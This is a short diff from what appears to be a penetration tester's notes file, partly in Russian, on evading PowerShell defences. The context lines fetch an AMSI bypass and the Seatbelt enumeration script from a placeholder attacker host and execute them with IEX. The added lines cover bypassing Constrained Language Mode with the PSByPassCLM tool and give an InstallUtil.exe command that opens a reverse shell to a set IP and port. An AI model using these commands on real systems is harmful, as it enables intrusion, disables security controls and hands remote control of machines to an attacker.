@@ -524,3 +524,17 @@ function Invoke-Seatbelt {
 $webClient = New-Object Net.WebClient;
 $webClient.DownloadString('http://PWNIP:PWNPO/AMSIBypass.ps1') | IEX;
 $webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
+
+
+# PowerShell ConstrainedLanguage Mode
+
+          https://github.com/padovah4ck/PSByPassCLM -----компилим солушенн
+
+          $ExecutionContext.SessionState.LanguageMode   ---- проверка моде
+
+          Этот пытается открыть реверс-шелл PS (я для спасения жизни привязал его к исходнику :-)..) ------>
+
+          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
+
+          ![image](https://github.com/mxdelta/Obfuscations/assets/121447514/61dcd2a4-5847-412e-9d92-dc9376f12fc3)
+
